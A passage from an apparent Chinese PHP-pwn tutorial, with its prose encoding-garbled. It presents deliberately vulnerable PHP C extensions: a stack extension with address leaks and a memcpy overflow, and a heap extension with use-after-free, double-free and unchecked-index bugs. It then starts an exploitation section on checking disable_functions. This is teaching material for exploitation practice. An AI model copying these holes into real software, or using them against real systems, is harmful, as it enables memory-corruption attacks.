class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* my_stack extension for PHP */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> HAVE_CONFIG_H</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&quot;config.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;php.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;ext/standard/info.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;php_my_stack.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* For compatibility with older PHP versions */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> ZEND_PARSE_PARAMETERS_NONE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ZEND_PARSE_PARAMETERS_NONE() \</span></span><br><span class="line"><span class="meta">	ZEND_PARSE_PARAMETERS_START(0, 0) \</span></span><br><span class="line"><span class="meta">	ZEND_PARSE_PARAMETERS_END()</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PHP_FUNCTION(my_stack_gift)</span><br><span class="line">        &#123;</span><br><span class="line">        	<span class="keyword">char</span> gift_data[<span class="number">0x10</span>];</span><br><span class="line">        	zend_string *retval;</span><br><span class="line">            ZEND_PARSE_PARAMETERS_NONE();</span><br><span class="line">            php_printf(<span class="string">&quot;PHP_Stack Gift function!---000\n&quot;</span>);</span><br><span class="line">		    retval = strpprintf(<span class="number">0</span>, <span class="string">&quot;Gift_Stack:0x%lx\nGift_Libc:0x%lx\nGift_ELF:0x%lx\n&quot;</span>,&amp;gift_data,&amp;<span class="built_in">printf</span>,&amp;zif_my_stack_gift);</span><br><span class="line">			RETURN_STR(retval);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PHP_FUNCTION(my_stack_func)</span><br><span class="line">        &#123;</span><br><span class="line">        	</span><br><span class="line">        	<span class="keyword">char</span>* buf = <span class="string">&quot;stackTest&quot;</span>;</span><br><span class="line">        	<span class="keyword">size_t</span> buf_len = <span class="keyword">sizeof</span>(<span class="string">&quot;stackTest&quot;</span>) - <span class="number">1</span>;</span><br><span class="line">        	ZEND_PARSE_PARAMETERS_START(<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line">            Z_PARAM_STRING(buf, buf_len)</span><br><span class="line">            ZEND_PARSE_PARAMETERS_END();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">			<span class="keyword">char</span> data[<span class="number">0x10</span>];</span><br><span class="line">        	php_printf(<span class="string">&quot;Welcome to my Stack!\n&quot;</span>);</span><br><span class="line">        	php_printf(<span class="string">&quot;		   --PIG-007\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        	php_printf(<span class="string">&quot;Gift_Stack:0x%lx\n&quot;</span>,&amp;data);</span><br><span class="line">		    php_printf(<span class="string">&quot;Gift_Libc:0x%lx\n&quot;</span>,&amp;<span class="built_in">printf</span>);</span><br><span class="line">		    php_printf(<span class="string">&quot;Gift_ELF:0x%lx\n&quot;</span>,&amp;zif_my_stack_func);</span><br><span class="line"></span><br><span class="line">        	<span class="built_in">memcpy</span>(data,buf,buf_len);</span><br><span class="line">        	php_printf(<span class="string">&quot;Over!\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; PHP_RINIT_FUNCTION</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">PHP_RINIT_FUNCTION(my_stack)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(ZTS) &amp;&amp; defined(COMPILE_DL_MY_STACK)</span></span><br><span class="line">	ZEND_TSRMLS_CACHE_UPDATE();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; PHP_MINFO_FUNCTION</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">PHP_MINFO_FUNCTION(my_stack)</span><br><span class="line">&#123;</span><br><span class="line">	php_info_print_table_start();</span><br><span class="line">	php_info_print_table_header(<span class="number">2</span>, <span class="string">&quot;my_stack support&quot;</span>, <span class="string">&quot;enabled&quot;</span>);</span><br><span class="line">	php_info_print_table_end();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; arginfo</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">ZEND_BEGIN_ARG_INFO(arginfo_my_stack_gift, <span class="number">0</span>)</span><br><span class="line">ZEND_END_ARG_INFO()</span><br><span class="line"></span><br><span class="line">ZEND_BEGIN_ARG_INFO(arginfo_my_stack_func, <span class="number">0</span>)</span><br><span class="line">ZEND_ARG_INFO(<span class="number">0</span>, data)</span><br><span class="line">ZEND_END_ARG_INFO()</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; my_stack_functions[]</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> zend_function_entry my_stack_functions[] = &#123;</span><br><span class="line">	PHP_FE(my_stack_gift,		arginfo_my_stack_gift)</span><br><span class="line">	PHP_FE(my_stack_func,		arginfo_my_stack_func)</span><br><span class="line">	PHP_FE_END</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; my_stack_module_entry</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">zend_module_entry my_stack_module_entry = &#123;</span><br><span class="line">	STANDARD_MODULE_HEADER,</span><br><span class="line">	<span class="string">&quot;my_stack&quot;</span>,					<span class="comment">/* Extension name */</span></span><br><span class="line">	my_stack_functions,			<span class="comment">/* zend_function_entry */</span></span><br><span class="line">	<span class="literal">NULL</span>,							<span class="comment">/* PHP_MINIT - Module initialization */</span></span><br><span class="line">	<span class="literal">NULL</span>,							<span class="comment">/* PHP_MSHUTDOWN - Module shutdown */</span></span><br><span class="line">	PHP_RINIT(my_stack),			<span class="comment">/* PHP_RINIT - Request initialization */</span></span><br><span class="line">	<span class="literal">NULL</span>,							<span class="comment">/* PHP_RSHUTDOWN - Request shutdown */</span></span><br><span class="line">	PHP_MINFO(my_stack),			<span class="comment">/* PHP_MINFO - Module info */</span></span><br><span class="line">	PHP_MY_STACK_VERSION,		<span class="comment">/* Version */</span></span><br><span class="line">	STANDARD_MODULE_PROPERTIES</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> COMPILE_DL_MY_STACK</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">ifdef</span> ZTS</span></span><br><span class="line">ZEND_TSRMLS_CACHE_DEFINE()</span><br><span class="line"><span class="meta"># <span class="meta-keyword">endif</span></span></span><br><span class="line">ZEND_GET_MODULE(my_stack)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br></pre></td></tr></table></div></figure>




        <h3 id="2-å †æ¨¡å—"   >
          <a href="#2-å †æ¨¡å—" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-å †æ¨¡å—" class="headerlink" title="(2)å †æ¨¡å—"></a>(2)å †æ¨¡å—</h3>
      <p>UAFï¼Œæº¢å‡ºï¼ŒdoubleFreeç­‰æ¼æ´</p>
<p>æµ‹è¯•ä»£ç ï¼Œå¦‚ä¸‹å³ä¸ºç”¨php7.3ç¼–è¯‘çš„ä»£ç ï¼Œå®ç°å››ä¸ªå‡½æ•°ï¼Œå¢åˆ æ”¹æŸ¥</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">my_heap_addFunc(18);</span><br><span class="line">my_heap_delFunc(0);</span><br><span class="line">my_heap_editFunc(0,&#x27;aaa&#x27;);</span><br><span class="line">my_heap_getFunc(0);</span><br></pre></td></tr></table></div></figure>

<p>é¢˜ç›®ä»£ç ï¼š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* my_heap extension for PHP */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> HAVE_CONFIG_H</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&quot;config.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;php.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;ext/standard/info.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;php_my_heap.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* For compatibility with older PHP versions */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> ZEND_PARSE_PARAMETERS_NONE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ZEND_PARSE_PARAMETERS_NONE() \</span></span><br><span class="line"><span class="meta">	ZEND_PARSE_PARAMETERS_START(0, 0) \</span></span><br><span class="line"><span class="meta">	ZEND_PARSE_PARAMETERS_END()</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span>* notelist[<span class="number">1000</span>];</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> count;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PHP_FUNCTION(my_heap_gift)</span><br><span class="line">        &#123;</span><br><span class="line">        	<span class="keyword">char</span> data[<span class="number">0x10</span>];</span><br><span class="line">        	zend_string *retval;</span><br><span class="line">            ZEND_PARSE_PARAMETERS_NONE();</span><br><span class="line">            php_printf(<span class="string">&quot;PHP_HEAP Gift function!---000\n&quot;</span>);</span><br><span class="line">		    retval = strpprintf(<span class="number">0</span>, <span class="string">&quot;Gift_Stack:0x%lx\nGift_Libc:0x%lx\nGift_ELF:0x%lx\n&quot;</span>,&amp;data,&amp;<span class="built_in">printf</span>,&amp;zif_my_heap_gift);</span><br><span class="line">RETURN_STR(retval);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PHP_FUNCTION(my_heap_addFunc)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">long</span> size = <span class="number">10</span>;</span><br><span class="line">                <span class="keyword">char</span>* chunk = <span class="literal">NULL</span>;</span><br><span class="line">                <span class="comment">//zend_string *retval;</span></span><br><span class="line">                php_printf(<span class="string">&quot;PHP_HEAP Add function!---001\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">                ZEND_PARSE_PARAMETERS_START(<span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">                Z_PARAM_LONG(size)</span><br><span class="line">                ZEND_PARSE_PARAMETERS_END();</span><br><span class="line">                chunk = _emalloc(size);</span><br><span class="line">                php_printf(<span class="string">&quot;chunk_addr:0x%lx\n&quot;</span>, chunk);</span><br><span class="line">                <span class="comment">//retval = strpprintf(0, &quot;chunk_addr:0x%lx&quot;, chunk);</span></span><br><span class="line">                <span class="keyword">if</span> (!chunk)</span><br><span class="line">                &#123;</span><br><span class="line">                    php_printf(<span class="string">&quot;Alloca Error\n&quot;</span>);</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//HELLO_G(greeting) ++;</span></span><br><span class="line">                notelist[count] = chunk;</span><br><span class="line">                chunk = <span class="literal">NULL</span>;</span><br><span class="line">                count ++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PHP_FUNCTION(my_heap_delFunc)</span><br><span class="line">        &#123;</span><br><span class="line">        	<span class="keyword">long</span> idx = <span class="number">0</span>;</span><br><span class="line">            php_printf(<span class="string">&quot;PHP_HEAP Free function!---002\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">            ZEND_PARSE_PARAMETERS_START(<span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">            Z_PARAM_LONG(idx)</span><br><span class="line">            ZEND_PARSE_PARAMETERS_END();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (notelist[idx])</span><br><span class="line">            &#123;</span><br><span class="line">                _efree(notelist[idx]);</span><br><span class="line">                <span class="comment">//notelist[noteChunk-&gt;idx] = NULL;</span></span><br><span class="line">                php_printf(<span class="string">&quot;Free Success!\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                php_printf(<span class="string">&quot;You can&#x27;t free it!There is no chunk!\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">PHP_FUNCTION(my_heap_editFunc)</span><br><span class="line">        &#123;</span><br><span class="line">        	<span class="keyword">long</span> idx = <span class="number">0</span>;</span><br><span class="line">        	<span class="keyword">char</span>* data = <span class="string">&quot;editTest&quot;</span>;</span><br><span class="line">        	<span class="keyword">size_t</span> data_len = <span class="keyword">sizeof</span>(<span class="string">&quot;editTest&quot;</span>) - <span class="number">1</span>;</span><br><span class="line">            php_printf(<span class="string">&quot;PHP_HEAP Edit function!---003\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">            ZEND_PARSE_PARAMETERS_START(<span class="number">2</span>,<span class="number">2</span>)</span><br><span class="line">            Z_PARAM_LONG(idx)</span><br><span class="line">            Z_PARAM_STRING(data, data_len)</span><br><span class="line">            ZEND_PARSE_PARAMETERS_END();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (notelist[idx])</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">memcpy</span>(notelist[idx],data,data_len);</span><br><span class="line">                php_printf(<span class="string">&quot;Edit Success!\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                php_printf(<span class="string">&quot;You can&#x27;t free it!There is no chunk!\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PHP_FUNCTION(my_heap_getFunc)</span><br><span class="line">        &#123;</span><br><span class="line">        	<span class="keyword">long</span> idx = <span class="number">0</span>;</span><br><span class="line">        	zend_string *retval;</span><br><span class="line">            ZEND_PARSE_PARAMETERS_START(<span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">            Z_PARAM_LONG(idx)</span><br><span class="line">            ZEND_PARSE_PARAMETERS_END();</span><br><span class="line"></span><br><span class="line">            php_printf(<span class="string">&quot;PHP_HEAP Show function!---004\n&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(notelist[idx])&#123;</span><br><span class="line">            	retval = strpprintf(<span class="number">0</span>, <span class="string">&quot;Content:%s\n&quot;</span>,notelist[idx]);</span><br><span class="line">                php_printf(<span class="string">&quot;Content:%s\n&quot;</span>,notelist[idx]);</span><br><span class="line">                php_printf(<span class="string">&quot;Show Success!\n&quot;</span>);</span><br><span class="line">                RETURN_STR(retval);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#125;&#125;&#125;*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; PHP_RINIT_FUNCTION</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">PHP_RINIT_FUNCTION(my_heap)</span><br><span class="line">        &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(ZTS) &amp;&amp; defined(COMPILE_DL_MY_HEAP)</span></span><br><span class="line">                ZEND_TSRMLS_CACHE_UPDATE();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> SUCCESS;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; PHP_MINFO_FUNCTION</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">PHP_MINFO_FUNCTION(my_heap)</span><br><span class="line">        &#123;</span><br><span class="line">        php_info_print_table_start();</span><br><span class="line">        php_info_print_table_header(<span class="number">2</span>, <span class="string">&quot;my_heap support&quot;</span>, <span class="string">&quot;enabled&quot;</span>);</span><br><span class="line">        php_info_print_table_end();</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; arginfo</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">ZEND_BEGIN_ARG_INFO(arginfo_my_heap_gift, <span class="number">0</span>)</span><br><span class="line">ZEND_END_ARG_INFO()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ZEND_BEGIN_ARG_INFO(arginfo_my_heap_addFunc, <span class="number">0</span>)</span><br><span class="line">ZEND_ARG_INFO(<span class="number">0</span>, addSize)</span><br><span class="line">ZEND_END_ARG_INFO()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ZEND_BEGIN_ARG_INFO(arginfo_my_heap_editFunc, <span class="number">0</span>)</span><br><span class="line">ZEND_ARG_INFO(<span class="number">0</span>, editIdx)</span><br><span class="line">ZEND_ARG_INFO(<span class="number">0</span>, editData)</span><br><span class="line">ZEND_END_ARG_INFO()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ZEND_BEGIN_ARG_INFO(arginfo_my_heap_delFunc, <span class="number">0</span>)</span><br><span class="line">ZEND_ARG_INFO(<span class="number">0</span>, delIdx)</span><br><span class="line">ZEND_END_ARG_INFO()</span><br><span class="line"></span><br><span class="line">ZEND_BEGIN_ARG_INFO(arginfo_my_heap_getFunc, <span class="number">0</span>)</span><br><span class="line">ZEND_ARG_INFO(<span class="number">0</span>, showIdx)</span><br><span class="line">ZEND_END_ARG_INFO()</span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; my_heap_functions[]</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">const</span> zend_function_entry my_heap_functions[] = &#123;</span><br><span class="line">        		PHP_FE(my_heap_gift,		arginfo_my_heap_gift)</span><br><span class="line">                PHP_FE(my_heap_addFunc,		arginfo_my_heap_addFunc)</span><br><span class="line">                PHP_FE(my_heap_delFunc,		arginfo_my_heap_delFunc)</span><br><span class="line">                PHP_FE(my_heap_editFunc,		arginfo_my_heap_editFunc)</span><br><span class="line">                PHP_FE(my_heap_getFunc,		arginfo_my_heap_getFunc)</span><br><span class="line">                PHP_FE_END</span><br><span class="line">        &#125;;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; my_heap_module_entry</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">        zend_module_entry my_heap_module_entry = &#123;</span><br><span class="line">                STANDARD_MODULE_HEADER,</span><br><span class="line">                <span class="string">&quot;my_heap&quot;</span>,					<span class="comment">/* Extension name */</span></span><br><span class="line">                my_heap_functions,			<span class="comment">/* zend_function_entry */</span></span><br><span class="line">                <span class="literal">NULL</span>,							<span class="comment">/* PHP_MINIT - Module initialization */</span></span><br><span class="line">                <span class="literal">NULL</span>,							<span class="comment">/* PHP_MSHUTDOWN - Module shutdown */</span></span><br><span class="line">                PHP_RINIT(my_heap),			<span class="comment">/* PHP_RINIT - Request initialization */</span></span><br><span class="line">                <span class="literal">NULL</span>,							<span class="comment">/* PHP_RSHUTDOWN - Request shutdown */</span></span><br><span class="line">                PHP_MINFO(my_heap),			<span class="comment">/* PHP_MINFO - Module info */</span></span><br><span class="line">                PHP_MY_HEAP_VERSION,		<span class="comment">/* Version */</span></span><br><span class="line">                STANDARD_MODULE_PROPERTIES</span><br><span class="line">        &#125;;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> COMPILE_DL_MY_HEAP</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">ifdef</span> ZTS</span></span><br><span class="line">ZEND_TSRMLS_CACHE_DEFINE()</span><br><span class="line"><span class="meta"># <span class="meta-keyword">endif</span></span></span><br><span class="line">ZEND_GET_MODULE(my_heap)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br></pre></td></tr></table></div></figure>






        <h1 id="ä¸‰ã€æ¼æ´åˆ©ç”¨"   >
          <a href="#ä¸‰ã€æ¼æ´åˆ©ç”¨" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä¸‰ã€æ¼æ´åˆ©ç”¨" class="headerlink" title="ä¸‰ã€æ¼æ´åˆ©ç”¨"></a>ä¸‰ã€æ¼æ´åˆ©ç”¨</h1>
      <p>ä¸€èˆ¬è€Œè¨€ï¼Œphp_pwnéƒ½å…ˆçœ‹çœ‹php.iniï¼Œå“ªäº›å‡½æ•°è¢«ç¦äº†ï¼Œæœç´¢<code>disable_functions</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202122026827.png" alt="image-20220212202639753"></p>
<p>å½“æ²¡æœ‰ç¦æ­¢includeå‡½æ•°ã€ob_startå‡½æ•°ã€ob_get_contentså‡½æ•°ã€ob_end_flushå‡½æ•°æ—¶ï¼Œå°±å¯ä»¥æ¥è°ƒç”¨ä»è€Œç›´æ¥è·å–åœ°å€ã€‚</p>

        <h2 id="1-EXPæ¨¡æ¿"   >
